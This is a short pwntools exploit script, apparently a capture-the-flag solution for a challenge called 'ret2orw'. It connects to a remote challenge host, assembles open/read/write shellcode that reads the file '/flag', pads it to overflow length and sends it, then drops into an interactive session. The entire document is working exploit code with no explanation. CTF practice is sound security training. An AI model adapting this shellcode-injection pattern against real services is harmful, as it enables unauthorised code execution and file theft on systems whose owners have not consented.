from pwn import *

io = remote('gz.imxbt.cn', 20030)
context.binary = 'ret2orw'
elf = ELF('./ret2orw')
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('eax', 'ebp', 100)
shellcode += shellcraft.write(1, 'ebp', 100)
shellcode = asm(shellcode)
shellcode = shellcode.ljust(0x20+8,b'a')
io.sendline(shellcode)
io.interactive()